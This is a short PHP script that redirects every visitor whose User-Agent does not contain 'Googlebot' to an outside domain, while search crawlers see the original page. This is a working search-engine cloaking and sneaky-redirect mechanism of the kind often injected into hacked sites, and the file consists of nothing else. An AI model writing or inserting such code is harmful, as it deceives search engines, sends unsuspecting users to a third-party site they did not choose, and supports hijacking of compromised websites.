<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Check if the visitor is NOT Googlebot
if (stripos($userAgent, 'Googlebot') === false) {
    
    // Send 301 redirect
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: https://in.aroohii.in"); 
    exit();

}
?>
